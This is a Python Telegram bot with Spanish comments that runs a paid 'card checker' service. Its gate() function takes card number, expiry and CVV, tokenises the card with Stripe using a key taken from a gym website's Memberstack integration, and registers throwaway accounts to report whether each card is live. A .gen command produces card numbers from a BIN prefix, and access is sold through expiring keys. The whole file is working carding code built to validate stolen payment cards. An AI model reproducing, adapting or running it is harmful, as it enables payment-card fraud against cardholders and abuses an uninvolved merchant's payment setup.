import os
import logging
import random
import string
import time
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ======================
# CONFIG
# ======================
TOKEN = os.getenv("BOT_TOKEN")
PORT = int(os.environ.get("PORT", 8443))

# Admins
ADMINS = [6629555218]  # <-- pon aquí tus IDs de admin

# Dominio público (puedes setear en ENV como WEBHOOK_URL)
WEBHOOK_URL = os.getenv("WEBHOOK_URL") or f"https://mi-bot-bottoken.up.railway.app/{TOKEN}"

# ======================
# LOGGING
# ======================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ======================
# VARIABLES GLOBALES
# ======================
KEYS_DB = {}  # Guardará: { "KEYCODE": fecha_expiracion_timestamp }
USERS_KEYS = {}  # { user_id: key }

# ======================
# FUNCIONES AUXILIARES
# ======================
def generar_key(longitud: int = 16) -> str:
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=longitud))

def formatear_tiempo_restante(expira_en: float) -> str:
    segundos = int(expira_en - time.time())
    if segundos <= 0:
        return "Expirada"
    dias = segundos // 86400
    horas = (segundos % 86400) // 3600
    minutos = (segundos % 3600) // 60
    return f"{dias}d {horas}h {minutos}m restantes"

# ======================
# FUNCIÓN DEL GATE
# ======================
def gate(cc, mes, ano, cvv):
    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k=15))) + '@gmail.com'
    
    headers_1 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
    payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
    r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()

    key = r1['stripeKey']

    headers_2 = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": "Mozilla/5.0"}
    payload_2 = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10080&key={key}"
    r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
    r2 = r_2.json()
    r2_text = r_2.text

    if 'declined' in r2_text:
        return "❌ Declined"
    else:
        if 'id' not in r2:  
            return "⚠️ Error en la tarjeta"
        tok = r2['id']
        headers_3 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
        payload_3 = '{"site":"3d821376ab5cea803122c65b3572cff0","email":"'+email+'","password":"Geho1902","membership":"62a0fa8eb4c4ff0004822daf","token":"'+tok+'"}'
        r = requests.post('https://api.memberstack.io/member/signup', headers=headers_3, data=payload_3)
        result = r.text
        if 'cvc' in result or 'token' in result:
            return "✅ Approved"
        elif 'Cloudflare' in result:
            return "⚠️ Proxy error, vuelve a intentar"
        else:
            return "❌ Declined"

# ======================
# HANDLERS
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("¡Bienvenido! Usa `.gen`, `.genkey`, `.claim` o `.pay` si tienes una key válida.")

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = update.message.text.split(" ", 1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usa el comando correctamente: `.gen BIN|MM|YYYY|CVV`")
        return

    bin_data = args[1]
    response = f"{bin_data}123456|04|2027|127"

    keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regen|{bin_data}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(response, reply_markup=reply_markup)

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        await update.message.reply_text("⛔ No tienes permisos para generar keys.")
        return

    args = update.message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await update.message.reply_text("❌ Usa el comando correctamente: `.genkey días`")
        return

    dias = int(args[1])
    if dias < 1:
        await update.message.reply_text("❌ Los días deben ser mayor que 0.")
        return

    key = generar_key()
    expira_en = time.time() + dias * 86400
    KEYS_DB[key] = expira_en

    keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regenkey|{dias}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"✅ Key generada:\n{key}\n\n⏳ Expira en {dias} días.",
        reply_markup=reply_markup
    )

async def claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usa: `.claim KEY`")
        return

    key = args[1].strip().upper()
    if key not in KEYS_DB:
        await update.message.reply_text("❌ Key inválida o no existe.")
        return

    expira_en = KEYS_DB[key]
    if time.time() > expira_en:
        await update.message.reply_text("⛔ Esta key ya expiró.")
        return

    user_id = update.effective_user.id
    USERS_KEYS[user_id] = key  

    tiempo_restante = formatear_tiempo_restante(expira_en)
    await update.message.reply_text(f"✨ Key válida y activada. {tiempo_restante}")

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        await update.message.reply_text("⛔ No tienes permisos de administrador.")
        return
    await update.message.reply_text("✅ Bienvenido admin, puedes usar los comandos especiales.")

async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in USERS_KEYS or USERS_KEYS[user_id] not in KEYS_DB:
        await update.message.reply_text("⛔ Necesitas reclamar una key válida con `.claim`.")
        return

    expira_en = KEYS_DB[USERS_KEYS[user_id]]
    if time.time() > expira_en:
        await update.message.reply_text("⛔ Tu key ya expiró.")
        return

    args = update.message.text.split()
    if len(args) != 2 or "|" not in args[1]:
        await update.message.reply_text("❌ Usa: `.pay CC|MM|YYYY|CVV`")
        return

    try:
        cc, mes, ano, cvv = args[1].split("|")
        result = gate(cc, mes, ano, cvv)
        await update.message.reply_text(f"💳 Resultado: {result}")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error al procesar: {e}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data.startswith("regen|"):
        bin_data = query.data.split("|", 1)[1]
        results = "\n".join([f"{bin_data}{i}23456|04|2027|127" for i in range(10)])
        keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regen|{bin_data}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(results, reply_markup=reply_markup)

    elif query.data.startswith("regenkey|"):
        dias = int(query.data.split("|", 1)[1])
        keys = []
        for _ in range(10):
            key = generar_key()
            expira_en = time.time() + dias * 86400
            KEYS_DB[key] = expira_en
            keys.append(f"{key} (⏳ {dias} días)")

        keyboard = [[InlineKeyboardButton("🔄 Regenerar 10 más", callback_data=f"regenkey|{dias}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text("✅ Keys generadas:\n" + "\n".join(keys), reply_markup=reply_markup)

# ======================
# MAIN
# ======================
def main():
    application = Application.builder().token(TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("claim", claim))
    application.add_handler(CommandHandler("admin", admin))

    # Handlers de mensajes
    application.add_handler(MessageHandler(filters.Regex(r"^\.genkey(?:\s|$)"), genkey))
    application.add_handler(MessageHandler(filters.Regex(r"^\.gen(?:\s|$)"), gen))
    application.add_handler(MessageHandler(filters.Regex(r"^\.claim(?:\s|$)"), claim))
    application.add_handler(MessageHandler(filters.Regex(r"^\.pay(?:\s|$)"), pay))

    application.add_handler(CallbackQueryHandler(button_callback))

    # Webhook config para Railway
    application.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=TOKEN,
        webhook_url=WEBHOOK_URL
    )

if __name__ == "__main__":
    main()